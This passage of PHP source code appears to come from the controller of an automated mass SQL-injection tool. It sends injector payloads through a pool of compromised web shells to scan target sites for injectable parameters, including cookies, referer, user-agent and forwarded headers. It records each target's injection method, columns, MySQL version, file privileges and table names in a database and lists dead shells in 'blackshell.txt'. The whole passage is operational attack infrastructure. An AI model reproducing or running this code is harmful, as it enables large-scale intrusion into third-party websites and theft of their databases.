								}
								
								
								if(@$arr[2][7]=='N' or @$arr[2][7]=='n')
								{
									
									$mysqlbd = 1;
									$file_priv = 0;
								}
								
								
								
								////////////////////////
								
								flush();
								
							
								$arr[2][6] =  substr($arr[2][6],0,30);
								
								
								if(preg_match("/,/",$arr[2][8]))
								{
									
									//$this->d('zapytua GOOD !!');
									$zap = true;
								}else{
									if($arr[2][8]=='' or $arr[2][8]==0){
										
										$zap = true;
									}
									
								}
								
								$lll = strlen($arr[2][8]);
								
							
							
								if(!empty($arr[2][3]) AND $urltic['host'] !='' and $arr[2][6] !='' and !empty($urltic['host']) and $arr[2][8] !='Gateway time-out' AND 	$lll < 55 and $arr[2][8] !='An error has occurred while processing your request.' AND $zap==TRUE and $arr[2][8] !='Während der Anfrage ist ein Fehler aufgetreten!' AND !preg_match("/Internal Server Error/i",$arr[0][1])  AND !preg_match("/405 Not Allowed/i",$arr[0][1]) AND  !preg_match("/Server Error/i",$tasks[$url]) AND  !preg_match("/Time-out/i",$tasks[$url]) AND  !preg_match("/error/i",$tasks[$url]))
								{
									
									$arr[2][6] = str_replace(array("'","\""), "", $arr[2][6]);
									$arr[2][8] = str_replace(array("'","\""), "", $arr[2][8]);

								
									$arr[2][1] = str_replace('post::','',$arr[2][1]);
									$arr[2][1] = str_replace('get::','',$arr[2][1]);
									
									
									//$this->d($arr[2],'arr_all zapis v BD');
									
									if($this->Post->query('UPDATE `posts` SET 
									`prohod` = 5,
									`url`="'.$arr[2][1].'",
									`gurl`="'.$arr[2][1].'",
									`tables`="'.mysql_real_escape_string($arr[2][8]).'",
									`status`=3,
									`work`="'.$arr[2][6].'",
									`sposob`="'.mysql_real_escape_string($arr[2][5]).'",
									`method`="'.mysql_real_escape_string($arr[2][2]).'",
									`column`="'.$arr[2][4].'",
									`mysqlbd`="'.$mysqlbd.'",
									`file_priv`="'.$file_priv.'",
									`version`="'.mysql_real_escape_string($arr[2][3]).'",
									`tic`='.$this->getcy($urltic['host']).',
									`sleep` ="'.mysql_real_escape_string($arr[2][9]).'"
									WHERE `id` ='.$id_new)){
										
										$this->d($domen,'update TRUE');
									}else{
										$this->d($domen,'update FALSE !');
										
										$this->d('UPDATE `posts` SET 
									`prohod` = 5,
									`url`="'.$arr[2][1].'",
									`gurl`="'.$arr[2][1].'",
									`tables`="'.mysql_real_escape_string($arr[2][8]).'",
									`status`=3,
									`work`="'.$arr[2][6].'",
									`sposob`="'.mysql_real_escape_string($arr[2][5]).'",
									`method`="'.mysql_real_escape_string($arr[2][2]).'",
									`column`="'.$arr[2][4].'",
									`mysqlbd`="'.$mysqlbd.'",
									`file_priv`="'.$file_priv.'",
									`version`="'.mysql_real_escape_string($arr[2][3]).'",
									`tic`='.$this->getcy($urltic['host']).',
									`sleep` ="'.mysql_real_escape_string($arr[2][9]).'"
									WHERE `id` ='.$id_new);
									}
									
									
									
								}
							}else
							{
								
								$this->d($arr,'arr_all _ PUSTO');
								$this->d($url['posts']['url'].":::PUSTO",$url2);
								
							}			
						}
						
					

				
						
						
					
						
						
					if(strstr($tasks[$url],'Internal Server Error') or strstr($tasks[$url],'405 Not Allowed')  or strstr($tasks[$url],'TURKHACKTEAM') or strstr($tasks[$url],'Während der Anfrage') or  strstr($tasks[$url],'502 Bad Gateway') or preg_match("/Internal Server Error/i",$arr[0][1]) or $arr[2][0]=='500 Internal Server Error' or strstr($tasks[$url],'TURKHACKTEAM') or strstr($tasks[$url],'Während der Anfrage') or strstr($tasks[$url],'Internal Server Error')  or strstr($tasks[$url],'HTTP Error') or strstr($tasks[$url],'not have permission') or strstr($tasks[$url],'Error del servidorn') or strstr($tasks[$url],'504 Gateway Time')  or strstr($tasks[$url],'Service Temporarily Unavailable') or strstr($tasks[$url],'Resource Limit Is Reached'))
					{	
                
                        //Resource Limit Is Reached
                        //Service Temporarily Unavailable
                        //Error del servidor
							//$this->d($content,'content $tasks[$url]');
					
							$filename = $_SERVER['DOCUMENT_ROOT']."/app/webroot/blackshell.txt";	
							
							//$fh = fopen($filename, "a+");
							if($this->local_shells==false){
								if(trim($url) !='')fwrite($fh, trim($shell_url)."\r\n");
							}
							
                            $this->d('+++++++++++++++');
                            
							$this->d($shell_url,'$shell_url');
                            
                            $this->d($url['posts']['url'],'url');
							
							$this->d(' Internal Server Error OTVET');
                            
                            $this->d('---------------');
						
						

					}else
					{
						
						
						if($this->Post->query('UPDATE  `posts` SET  `prohod` = 5,`multi_count`=multi_count+1,`date`="'.$date.'" WHERE  `id` ='.$id_new))
						{
                            
                            $this->d('UPDATE  `posts` SET  `prohod` = 5,`multi_count`=multi_count+1,`date`="'.$date.'" WHERE  `id` ='.$id_new);
							$this->d('good prohod update');
						}else
						{
							$this->d('FALSE prohod update');
							$this->d('UPDATE  `posts` SET  `prohod` = 5,`multi_count`=multi_count+1,`date`="'.$date.'" WHERE  `id` ='.$id_new);
							
						}
						
					
					}	
						
						


						curl_multi_remove_handle($cmh, $ch);

						curl_close($ch);

					//	exit;
						//if(count($newservv)==0)$newservv = $serv;		
						
						if(count($urls)>0)
						{			
							
							echo 'zapusk dopolnitelno<br>';	
							
							$kkk = count($newservv);
							$lll = mt_rand(1,$kkk);
							$urserv = $newservv[$lll];
							$urs_shell = $urserv;
							
							
							$urs_one = array_shift($urls);
							if(!empty($urs_shell))
							{
								
								
								$urlllll = str_replace('http://', '', trim($urs_one['posts']['url'])); 
								$ch = $this->create_streem($urs_shell,$urlllll.'::'.trim($urs_one['posts']['http']).'::'.$urs_one['posts']['header'],$this->multi_time);	
								$tasks[$urs_one['posts']['url'].':::'.$urs_one['posts']['id']] = $ch;
								curl_multi_add_handle($cmh, $ch);
							}				
						}
						
					}
				}
				while ($mrc == CURLM_CALL_MULTI_PERFORM);
			}
		}
		
		curl_multi_close($cmh);

		

		$this->stop();
		
		die();

	}
	
	function multi_all($test=''){// Проверка url в таблицы posts_all
		
		
		uses('xml');

		
		//если есть пустые и не проверенные, то прекращаем
		$file = $this->Post->query("SELECT count(*) as count FROM `$this->table_post` WHERE `status`=0");
		
		
		if(intval($file[0][0]['count'])!==0)
		{
			
			//$this->logs('stepTwo STOP - stepOne vipolnyetsya: '.intval($file[0][0]['count']),__FUNCTION__);
			//die('stepTwo STOP - stepOne vipolnyetsya: '.intval($file[0][0]['count']));	
		}
		$r = rand(1,100);
		
		
			$this->Post->query("UPDATE  `$this->table_post`  set `url` =  REPLACE(url,'\"','')");
		
		
		$this->timeStart = $this->start('stepTwo_all',1);
		
		//$urls = $this->Post->query("SELECT * FROM `$this->table_post` WHERE `status`=2 AND `prohod`<5 limit ".$this->multi_limit_all);
		//AND find !='post'
		$urls = $this->Post->query("SELECT * FROM `$this->table_post` WHERE `status`=2 AND `prohod`<5 AND `insert_post` =0 AND (find !='cookies' AND find !='referer'  AND find !='useragent'  and find !='forwarder')  GROUP by `domen`  limit ".$this->multi_limit_all);
		
		$this->d($urls,'$urls GROUP BY ');
		//exit;
		if(count($urls)==0)
		{
			
			$this->stop();
			
			echo 'Нету ссылок';
			die();
		}
		
		
		//exit;
		

		$this->evaltest();

		echo '<h1>Загрузили шеллы</h1>';
		flush();
		$serv  = $this->serv;
		
		
		
			
		$filename = str_replace('webroot/index.php', 'controllers/components/injector.php',$_SERVER['SCRIPT_FILENAME']);
		$injectorfile = file_get_contents($filename);
		$code = str_replace('URLURL', 'URLURL', file_get_contents('code.php'));
		$conf = file_get_contents($_SERVER['DOCUMENT_ROOT'].'/config.php');
		$conf = str_replace(array('<?php','?>'), '', $conf);
		$injconf = str_replace('include($_SERVER["DOCUMENT_ROOT"]."/config.php");', $conf , $injectorfile);
		$this->code = str_replace(array('<?php','?>'), '', $injconf.$code);
		
		
		
		
		
		
		
		
		$cmh = curl_multi_init();

		
		$tasks = array();

		$count_serv = count($serv);
		$count_urls = count($urls);
		$i=0;

		
		$this->proxyCheck();
		
		
		$this->d($count_serv,'count_serv_kolichetvo!!');
		
		$this->d($count_urls,'$count_urls');
		
		$newservv = $serv;

		for($i=0;$i<$count_urls;$i++)
		{
			
			
			
			$this->workup();
			
			if($i==$count_serv or count($urls) == 0)
			{
				$this->d($i,'count->break'); 
				break;
			}
			
			flush();
			
			//$urs_shell = array_shift($newservv);
			
			$kkk = count($newservv);
			$lll = mt_rand(1,$kkk);
			$urserv = $newservv[$lll];
			$urs_shell = $urserv;
			
			
			$urs_one = array_shift($urls);
			
			$urs_shell = trim($urs_shell);
			
			
			//$this->d($urs_shell,'$urs_shell');
			//$this->d($urs_one,'$urs_one');
			
			if(!empty($urs_shell))
			{
				
				$urlllll = trim($urs_one[$this->table_post]['url']); 
				
			
				//$urls[] = $val[$this->table_post]['url'].'++'.$val[$this->table_post]['http'].'++'.$val[$this->table_post]['header'];
				
				//exit;
				
				$ch = $this->create_streem($urs_shell,$urlllll.'::'.$urs_one[$this->table_post]['http'].'::'.$urs_one[$this->table_post]['header'],$this->multi_time);	
				$tasks[$urs_shell.':::'.$urs_one[$this->table_post]['url'].':::'.$urs_one[$this->table_post]['id']] = $ch;
				
				//$tasks[$urs_one[$this->table_post]['url'].':::'.$urs_one[$this->table_post]['id']] = $ch;
				
				curl_multi_add_handle($cmh, $ch);
			}
		}
		
		
		//$this->d($tasks,'$tasks');
		//exit;
		
		$active = null;

		
		do 
		{
			
			$mrc = curl_multi_exec($cmh, $active);
		}

		while ($mrc == CURLM_CALL_MULTI_PERFORM);


		while ($active && ($mrc == CURLM_OK)) 
		{
			
			if (curl_multi_select($cmh) != -1) 
			{
				
				do 
				{
					
					$this->workup();
					
					$mrc = curl_multi_exec($cmh, $active);

					$info = curl_multi_info_read($cmh);

					if ($info['msg'] == CURLMSG_DONE) 
					{
						
						
						
						
						$ch = $info['handle'];

						$url = array_search($ch, $tasks);

						$tasks[$url] = curl_multi_getcontent($ch);
						

						
						
						
						$content = $tasks[$url];
						
						//$url = explode(':::', $url);
						//$url[$this->table_post]['id'] =  $url[1];
						//$url[$this->table_post]['url'] = $url[0];
						
						if($this->debug==true){$this->d($content,'$content');}
						
						//$url2 = $url[0];
						
						
						$url = explode(':::', $url);
						$shell_url =  $url[0];
						
						$url[$this->table_post]['id'] =  $url[2];
						$url[$this->table_post]['url'] = $url[1];
						
						
						$id_new = $url[2];
                        
                        $id_new = str_replace('askldjl2913912ksdal','',$id_new);
                        $id_new = trim($id_new);
                        
						$url2 = $url[1];
						
						
						$this->d($url,'url content');
						
					
						//exit;
						
						////////////////////////////////////	
						$url[$this->table_post]['url'] = str_replace('http://http://','http://',trim($url[$this->table_post]['url']));
						$url[$this->table_post]['url'] = str_replace('http://	http://','http://',trim($url[$this->table_post]['url']));
						$url[$this->table_post]['url'] = str_replace('http://http://','http://',trim($url[$this->table_post]['url']));
						$url[$this->table_post]['url'] = str_replace('http://http:// ','http://',trim($url[$this->table_post]['url']));
						$url[$this->table_post]['url'] = str_replace('http://','',trim($url[$this->table_post]['url']));
						$url[$this->table_post]['url'] = str_replace('http://','',$url[$this->table_post]['url']);
						$url[$this->table_post]['url'] = str_replace('https://','',$url[$this->table_post]['url']);
					
						
						$urltic = parse_url('http://'.$url[$this->table_post]['url']);
						$domen = $urltic['host'];
						
						$domen = str_replace('www.www.www.','',$domen);
						$domen = str_replace('www.www.','',$domen);
						$domen = str_replace('www.','',$domen);
						
						$domen2 = 'www.'.$domen;
						
						$date = date('Y-m-d h:i:s');
						
						flush();

						if(strstr($content,'falze'))
						{
							$this->d($url2.":::FALZE");
							$exp = explode('::', $content);
							$ggg = 'FALZE';
							
						}else
						{
							
							
							$this->d($url2.":::OK!!");
							preg_match_all("~<(.*?)>(.*?)<\/(.*?)>~",$content,$arr);
							
								$this->d($arr,'arr_all');
							
							
							if(isset($arr[2][1]))
							{	
								$file_priv = 0;
								$mysqlbd = 0;
								
								if(@$arr[2][7]=='Y' or @$arr[2][7]=='y')
								{
									
									$mysqlbd = 1;
								 	$file_priv = 1;
								}
								
								
								if(@$arr[2][7]=='N' or @$arr[2][7]=='n')
								{
									
									$mysqlbd = 1;
									$file_priv = 0;
								}
								
								
								
								////////////////////////
								
								flush();
								
							
								$arr[2][6] =  substr($arr[2][6],0,30);
								
								
								if(preg_match("/,/",$arr[2][8]))
								{
									
									$this->d('zapytua GOOD !!');
									$zap = true;
								}else{
									if($arr[2][8]=='' or $arr[2][8]==0){
										
										$zap = true;
									}
									
								}
								
								$lll = strlen($arr[2][8]);
								
							
							
								if(!empty($arr[2][3]) AND $urltic['host'] !='' and $arr[2][6] !='' and !empty($urltic['host']) and $arr[2][8] !='Gateway time-out' AND 	$lll < 55 and $arr[2][8] !='An error has occurred while processing your request.' AND $zap==TRUE and $arr[2][8] !='Während der Anfrage ist ein Fehler aufgetreten!' AND !preg_match("/Internal Server Error/i",$arr[0][1])  AND !preg_match("/405 Not Allowed/i",$arr[0][1]) AND  !preg_match("/Server Error/i",$tasks[$url]) AND  !preg_match("/Time-out/i",$tasks[$url]))
								{
									
									$arr[2][6] = str_replace(array("'","\""), "", $arr[2][6]);
									$arr[2][8] = str_replace(array("'","\""), "", $arr[2][8]);

								
									$arr[2][1] = str_replace('post::','',$arr[2][1]);
									$arr[2][1] = str_replace('get::','',$arr[2][1]);
									
									
									//$this->d($arr[2],'arr_all zapis v BD');
									
									if($this->Post->query('UPDATE `'.$this->table_post.'` SET
									
									`prohod` = 5,
									`url`="'.$arr[2][1].'",
									`gurl`="'.$arr[2][1].'",
									`tables`="'.mysql_real_escape_string($arr[2][8]).'",
									`status`=3,
									`work`="'.$arr[2][6].'",
									`sposob`="'.mysql_real_escape_string($arr[2][5]).'",
									`method`="'.mysql_real_escape_string($arr[2][2]).'",
									`column`="'.$arr[2][4].'",
									`mysqlbd`="'.$mysqlbd.'",
									`file_priv`="'.$file_priv.'",
									`version`="'.mysql_real_escape_string($arr[2][3]).'",
									`tic`='.$this->getcy($urltic['host']).',
									`sleep` ="'.mysql_real_escape_string($arr[2][9]).'"
									WHERE  id ='.$id_new)){
									
									//WHERE  url = "'.$url2.'"')){
										//WHERE `domen` ="'.$domen.'" or `domen` ="'.$domen2.'" or url = "'.$url2.'"')){
										
										//$this->Post->query("INSERT INTO `posts` SELECT `url`,`gurl`,`tables`,`status`,`work`,`sposob`,`method` FROM `posts_all` WHERE status=2");
										$this->check_posts_all_to_post($id_new);
										
										
										$this->d($domen,'update TRUE');
									}else{
										$this->d($domen,'update FALSE NE SMOG OBNOVIT multi_all !!!!!!!!');
										
										$this->d('UPDATE `'.$this->table_post.'` SET 
										
									`prohod` = 5,
									`url`="'.$arr[2][1].'",
									`gurl`="'.$arr[2][1].'",
									`tables`="'.mysql_real_escape_string($arr[2][8]).'",
									`status`=3,
									`work`="'.$arr[2][6].'",
									`sposob`="'.mysql_real_escape_string($arr[2][5]).'",
									`method`="'.mysql_real_escape_string($arr[2][2]).'",
									`column`="'.$arr[2][4].'",
									`mysqlbd`="'.$mysqlbd.'",
									`file_priv`="'.$file_priv.'",
									`version`="'.mysql_real_escape_string($arr[2][3]).'",
									`tic`='.$this->getcy($urltic['host']).',
									`sleep` ="'.mysql_real_escape_string($arr[2][9]).'"
									WHERE  id = '.$id_new);
									}
									
									
									
								}
							}else
							{
								
								$this->d($arr,'arr_all _ PUSTO');
								$this->d($url[$this->table_post]['url'].":::PUSTO",$url2);
								
							}			
						}
						
					

				
						
						
							
					
					
					
						
						
					if(strstr($tasks[$url],'Internal Server Error') or strstr($tasks[$url],'405 Not Allowed')  or strstr($tasks[$url],'TURKHACKTEAM') or strstr($tasks[$url],'Während der Anfrage') or  strstr($tasks[$url],'502 Bad Gateway') or preg_match("/Internal Server Error/i",$arr[0][1]) or $arr[2][0]=='500 Internal Server Error' or strstr($arr[0][1],'TURKHACKTEAM') or strstr($arr[0][1],'Während der Anfrage') or strstr($arr[0][1],'Internal Server Error')  or strstr($tasks[$url],'HTTP Error') or strstr($tasks[$url],'not have permission') )
					{	
					
							//$this->d($content,'content $tasks[$url]');
					
							$filename = $_SERVER['DOCUMENT_ROOT']."/app/webroot/blackshell.txt";	
							
							//$fh = fopen($filename, "a+");
							if($this->local_shells==false){
								if(trim($url) !='')fwrite($fh, trim($shell_url)."\r\n");
							}
							
							$this->d($shell_url,'$shell_url');
							
							$this->d(' Internal Server Error OTVET');
						
						

					}else
					{
						
						
						//if($this->Post->query('UPDATE  `$this->table_post` SET  `prohod` = 5,`multi_count`=multi_count+1,`date`="'.$date.'" WHERE  `domen` ="'.$domen.'" or `domen` ="'.$domen2.'" or url = "'.$url2.'"'))
						//if($this->Post->query('UPDATE  `'.$this->table_post.'` SET  `prohod` = 5,`multi_count`=multi_count+1,`date`="'.$date.'" WHERE  url = "'.$url2.'"'))	
						if($this->Post->query('UPDATE  `'.$this->table_post.'` SET  `prohod` = 5,`multi_count`=multi_count+1,`date`="'.$date.'" WHERE  `id` = '.$id_new))
						{
							$this->d('good prohod update OBNOVLYET PROHOD=5');
						}else
						{
							$this->d('FALSE prohod update  NE SMOG PROHOD =5 OBNOVIT multi_all');
							$this->d('UPDATE  `'.$this->table_post.'` SET  `prohod` = 5,`multi_count`=multi_count+1,`date`="'.$date.'" WHERE  `id` = '.$id_new);
							
						}
						
					
					}	
						
						


						curl_multi_remove_handle($cmh, $ch);

						curl_close($ch);

					//	exit;
						//if(count($newservv)==0)$newservv = $serv;		
						
						if(count($urls)>0)
						{			
							
							echo 'zapusk dopolnitelno<br>';	
							
							$kkk = count($newservv);
							$lll = mt_rand(1,$kkk-1);
							$urserv = $newservv[$lll];
							$urs_shell = $urserv;
							
							
							$urs_one = array_shift($urls);
							if(!empty($urs_shell))
							{
								
								
								$urlllll = str_replace('http://', '', trim($urs_one[$this->table_post]['url'])); 
								$ch = $this->create_streem($urs_shell,$urlllll.'::'.$urs_one[$this->table_post]['http'].'::'.$urs_one[$this->table_post]['header'],$this->multi_time);	
								$tasks[$urs_shell.':::'.$urs_one[$this->table_post]['url'].':::'.$urs_one[$this->table_post]['id']] = $ch;
								curl_multi_add_handle($cmh, $ch);
							}				
						}
						
					}
				}
				while ($mrc == CURLM_CALL_MULTI_PERFORM);
			}
		}
		
		curl_multi_close($cmh);

		

		$this->stop();
		
		die();

	}
	

	
	
	function headFinder($test=''){//поиск sqli в заголовках там где не смог явные подобрать  БЕРЕТ STATUS 1 ГДЕ БЫЛО ХУЕВО И СТАВИТЬ 11 КОГДА СОВСЕМ ХУЕВО
			
			
			if($this->head_check==false)return;
			
			$this->black_site();
			
			$file = $this->Post->query("SELECT count(*) as count FROM `posts` WHERE `status`=1");
			
			

			if(intval($file[0][0]['count'])!==0)
			{		
				$this->timeStart = $this->start('stepOneHead',1);
			}else
			{
			die('TimeStartHead');
			}		
			
			$this->Post->query("DELETE FROM `posts` WHERE `domen` like 'www.%'");
			
			$r = rand(1,100);
		
			
			
			$this->Post->query("UPDATE  `posts`  set `url` =  REPLACE(url,'http://http://','http://')");
			
		
			
			$file = $this->Post->query("SELECT * FROM `posts` WHERE `status`=1 limit 100");
			
			
			$this->evaltest();
			
			foreach ($file as $val)
			{
                $val['posts']['http'] = trim($val['posts']['http']);
				$urls[] = $val['posts']['url'].'++'.$val['posts']['http'];
				
				
			}
			
			
			//$this->d($urls,'$urls');
			//exit;
			//$filename = str_replace('webroot/index.php', 'controllers/components/injector.php',$_SERVER['SCRIPT_FILENAME']);
			
			/**
			$injectorfile = file_get_contents($filename);
			$injectorfile = str_replace(array('<?php','?>','class InjectorComponent {','error_reporting(0);','set_time_limit(0);'), '', $injectorfile);
			$conf = file_get_contents($_SERVER['DOCUMENT_ROOT'].'/config.php');
			///$conf = str_replace(array('<?php','?>','class InjectorComponent {'), '', $conf);
			//$conf = 'class InjectorComponent { '.$conf ;
			//$conf = str_replace('$this->', 'var $', $conf);
			//$code = str_replace('URLURL', 'URLURL', file_get_contents('sql_head.php'));
			$this->code = str_replace(array('<?php','?>'), '', $conf .$injectorfile.$code);
			
			**/
			
			
		
			//$this->d($conf,'conf');
			
			$filename = str_replace('webroot/index.php', 'controllers/components/injector.php',$_SERVER['SCRIPT_FILENAME']);
			
			$injectorfile = file_get_contents($filename);
			
			$code = str_replace('URLURL', 'URLURL', file_get_contents('sql_head.php'));

			
			
			$conf = file_get_contents($_SERVER['DOCUMENT_ROOT'].'/config.php');
			$conf = str_replace(array('<?php','?>'), '', $conf);
			//$conf = str_replace('$this->', 'var $', $conf);
			
			$injconf = str_replace('include($_SERVER["DOCUMENT_ROOT"]."/config.php");', $conf , $injectorfile);
			
			
			
			$this->code = str_replace(array('<?php','?>'), '', $injconf.$code);
			
			
			
			
			
			//$this->d($this->code,'code');
			//exit;
			$cmh = curl_multi_init();

			$tasks = array();
			
			$count_serv = count($this->serv);
			$count_urls = count($urls);
			$i=0;

			$this->d($count_serv,'count_serv_kolichetvo!!');
			
			$this->d($count_urls,'$count_urls');
			
			for($i=0;$i<$count_urls;$i++)
			{
				
				
				$this->workup();
				echo $i.' - i<br>';
				
				if($i==$count_serv or count($urls) == 0)
				{
					$this->d($i,'count->break'); 
					break;
				}
				
				
				$urserv = $this->serv[$i];	
				if($urserv =='')break;	
				
				
				$ch = $this->create_streem($urserv,array_shift($urls),40);
				$this->d($ch);
				$tasks[$urserv] = $ch;
				curl_multi_add_handle($cmh, $ch);
				
			}
			
			
			
			
			$active = null;

			do 
			{
				$mrc = curl_multi_exec($cmh, $active);
			}
			while ($mrc == CURLM_CALL_MULTI_PERFORM);


			while ($active && ($mrc == CURLM_OK)) 
			{

				if (curl_multi_select($cmh) != -1) 
				{
					do 
					{
						
						$mrc = curl_multi_exec($cmh, $active);

						$info = curl_multi_info_read($cmh);

						if ($info['msg'] == CURLMSG_DONE) 
						{
							$ch = $info['handle'];
							
							$this->d($ch,'ch');

							$url = array_search($ch, $tasks);

							$tasks[$url] = curl_multi_getcontent($ch);
							$cont = explode(':::', $tasks[$url]);
							$cont[1] = trim($cont[1]);
							
							//$this->d($tasks[$url],"$url");
							
							
							$cont[0] = str_replace('http://http://','http://',trim($cont[0]));
							$cont[0] = str_replace('http://	http://','http://',trim($cont[0]));
							$cont[0] = str_replace('http://http://','http://',trim($cont[0]));
							$cont[0] = str_replace('http://http:// ','http://',trim($cont[0]));
							$cont[0] = str_replace('http://','',trim($cont[0]));
							
							
							$kk = $cont[0];
							$kk = 'http://'.$kk;
							$tmp = parse_url($kk);
							
							$domen = mysql_real_escape_string ($tmp['host']);
								$domen = str_replace('www.www.www.','',$domen);
							$domen = str_replace('www.www.','',$domen);
							$domen = str_replace('www.','',$domen);
							$tt = str_replace('www.','',$domen);
							$domen2 = 'www.'.$tt;
							
							
							if(!strstr($cont[1],'false') AND trim($cont[1])!=='' AND trim($cont[0])!=='')
							{
								
								
								
								$id = $this->Post->query("SELECT `id` FROM `posts` WHERE `domen` = '".$domen."' or `domen` = '".$domen2."'");
								
								
								
								
								$this->d("SELECT `id` FROM posts WHERE `domen` = '".$domen."' or `domen` = '".$domen2."'");
								
								if(count($id)==1)
								{
									if(!strstr($cont[1], '%'))
									{
										$this->d($cont[0],'url found SQLI OK!!!!');
										
										$this->Post->query("UPDATE `posts` SET `find`='".$cont[1]."',`status`=2,`tic`='".$this->getcy('http://'.$tmp['host'])."' WHERE `id`=".$id[0]['posts']['id']);
									}
									
								}else
								{
									$this->d($cont[0],'SQLI OK! id  NOT found!!  '. $cont[1]);
								}
								
							}
							
							
							if(strstr($cont[1],'false') AND trim($cont[0])!=='')
							{
								$this->d('count[1] = false AND $cont[0] !=""');
								
								$id = $this->Post->query("SELECT `id` FROM `posts` WHERE  `domen` = '".$domen."' or `domen` = '".$domen2."'");
								
								$this->d("SELECT `id` FROM `posts` WHERE  `domen` = '".$domen."' or `domen` = '".$domen2."'");
								
								if(count($id)==1)
								{
									$this->Post->query("UPDATE `posts` SET `status`=11 WHERE `id` =".$id[0]['posts']['id']);
								}else
								{
									$this->d($cont[0],'HUEVO  FALSE id NOT found!!');
								}
								
							}

							flush();

							curl_multi_remove_handle($cmh, $ch);

							curl_close($ch);
							
							if(count($urls)>0)
							{
								echo 'zapusk dopolnitelno<br>';	
								
								$kkk = count($this->serv);
								$lll = mt_rand(1,$kkk);
								$urserv = $this->serv[$lll];
								
								$ch = $this->create_streem($urserv,array_shift($urls));			
								$tasks[$urserv] = $ch;
								curl_multi_add_handle($cmh, $ch);
							}
						}
						
						$this->workup();
						
					}
					while ($mrc == CURLM_CALL_MULTI_PERFORM);
				}
			}

			curl_multi_close($cmh);

			//$file = $this->Post->query("SELECT `id` FROM `posts` WHERE `status`=0");	

			if(count($file)<10)
			{	
				//$this->errorFinder();
				//$this->Post->query("DELETE FROM `posts` WHERE `status` =0");	
			}
			
			$this->stop();
			
			die('end errorfind');

		}	
		
	function headMulti($test=''){// проверка на sqli инъекцию через хедеры
			
			
			uses('xml');

			
			//если есть пустые и не проверенные, то прекращаем
		
			$r = rand(1,100);
			
			
				$this->Post->query("UPDATE  `posts`  set `url` =  REPLACE(url,'\"','')");
			
			
			$this->timeStart = $this->start('stepTwoHead',1);
			
			$urls = $this->Post->query("SELECT * FROM `posts` WHERE `status`=2 AND `prohod` <5 AND (find ='cookies' or find ='referer' or find ='post' or find ='useragent'  or find ='forwarder') limit 5");
			
			//$urls = $this->Post->query("SELECT * FROM `posts` WHERE  find ='cookies' or find ='referer' or find ='post' or find ='useragent'  or find ='forwarder' AND id=4155");
			
			$this->d($urls,'$urls');
			//exit;
			if(count($urls)==0)
			{
				
				$this->stop();
				
				echo 'Нету ссылок';
				die();
			}
			
			
			
			

			$this->evaltest();

			echo '<h1>Загрузили шеллы</h1>';
			flush();
			$serv  = $this->serv;
			
			$filename = str_replace('webroot/index.php', 'controllers/components/injector.php',$_SERVER['SCRIPT_FILENAME']);
			$injectorfile = file_get_contents($filename);
			$code = str_replace('URLURL', 'URLURL', file_get_contents('code_head.php'));
			$conf = file_get_contents($_SERVER['DOCUMENT_ROOT'].'/config.php');
			$conf = str_replace(array('<?php','?>'), '', $conf);
			$injconf = str_replace('include($_SERVER["DOCUMENT_ROOT"]."/config.php");', $conf , $injectorfile);
			
			$this->code = str_replace(array('<?php','?>'), '', $injconf.$code);
			
		//	$this->d($this->code,'$this->code');
			//exit;
			
			
			$cmh = curl_multi_init();

			
			$tasks = array();

			$count_serv = count($serv);
			$count_urls = count($urls);
			$i=0;

			
			
			$this->d($count_serv,'count_serv_kolichetvo!!');
			
			$this->d($count_urls,'$count_urls');
			
			$newservv = $serv;

			for($i=0;$i<$count_urls;$i++)
			{
				
				
				
				$this->workup();
				
				if($i==$count_serv or count($urls) == 0)
				{
					$this->d($i,'count->break'); 
					break;
				}
				
				flush();
				
				$urs_shell = array_shift($newservv);
				$urs_shell = trim($urs_shell);
				$urs_one = array_shift($urls);
				
				
				//$this->d($urs_shell,'$urs_shell');
				//$this->d($urs_one,'$urs_one');
				
				if(!empty($urs_shell))
				{
					
					$urlllll = trim($urs_one['posts']['url']); 
					$urlllll = trim($urlllll);
					
					$inject = $urs_one['posts']['find'];
					
					
					$this->d($urs_shell,$urlllll.'::'.trim($urs_one['posts']['http']).'::'.$inject);
					
					$ch = $this->create_streem($urs_shell,$urlllll.'::'.trim($urs_one['posts']['http']).'::'.$inject,150);	
					$tasks[$urs_one['posts']['url'].':::'.$urs_one['posts']['id']] = $ch;
					
					curl_multi_add_handle($cmh, $ch);
				}
			}
			
			
			$this->d($tasks,'$tasks');
			//exit;
			
			$active = null;

			
			do 
			{
				
				$mrc = curl_multi_exec($cmh, $active);
			}

			while ($mrc == CURLM_CALL_MULTI_PERFORM);


			while ($active && ($mrc == CURLM_OK)) 
			{
				
				if (curl_multi_select($cmh) != -1) 
				{
					
					do 
					{
						
						$this->workup();
						
						$mrc = curl_multi_exec($cmh, $active);

						$info = curl_multi_info_read($cmh);

						if ($info['msg'] == CURLMSG_DONE) 
						{
							
							////
							
								
							
							///
							
							
							$ch = $info['handle'];

							$url = array_search($ch, $tasks);

							$tasks[$url] = curl_multi_getcontent($ch);
							

								//$filename = $_SERVER['DOCUMENT_ROOT']."/app/webroot/blackshell.txt";	
								//$fh = fopen($filename, "a+");
								
								//if(strstr($tasks[$url],'Internal Server Error') or strstr($tasks[$url],'405 Not Allowed')  or strstr($tasks[$url],'TURKHACKTEAM') or strstr($tasks[$url],'Während der Anfrage'))
								//{	
										//$this->d('Internal Server Error');
										//if(trim($url) !='')fwrite($fh, trim($url)."\r\n");
										
							//	}	
							
							
							$content = $tasks[$url];
							
							$url = explode(':::', $url);
							$shell_url =  $url[0];
							
							$url['posts']['id'] =  $url[1];
							$url['posts']['url'] = $url[0];
							
							$url2 = $url[0];
							
							
							
							$this->d($content,'cont');
							//exit;
							
							////////////////////////////////////	
							$url['posts']['url'] = str_replace('http://http://','http://',trim($url['posts']['url']));
							$url['posts']['url'] = str_replace('http://	http://','http://',trim($url['posts']['url']));
							$url['posts']['url'] = str_replace('http://http://','http://',trim($url['posts']['url']));
							$url['posts']['url'] = str_replace('http://http:// ','http://',trim($url['posts']['url']));
							$url['posts']['url'] = str_replace('http://','',trim($url['posts']['url']));
							$url['posts']['url'] = str_replace('http://','',$url['posts']['url']);
							$url['posts']['url'] = str_replace('https://','',$url['posts']['url']);
						
							
							$urltic = parse_url('http://'.$url['posts']['url']);
							$domen = $urltic['host'];
							
							$domen = str_replace('www.www.www.','',$domen);
							$domen = str_replace('www.www.','',$domen);
							$domen = str_replace('www.','',$domen);
							
							$domen2 = 'www.'.$domen;
							
							
							
							flush();

							if(strstr($content,'falze'))
							{
								$this->d($url['posts']['url'].":::FALZE");
								$exp = explode('::', $content);
								$ggg = 'FALZE';
								
							}else
							{
								
								
								$this->d($url['posts']['url'].":::OK!!");
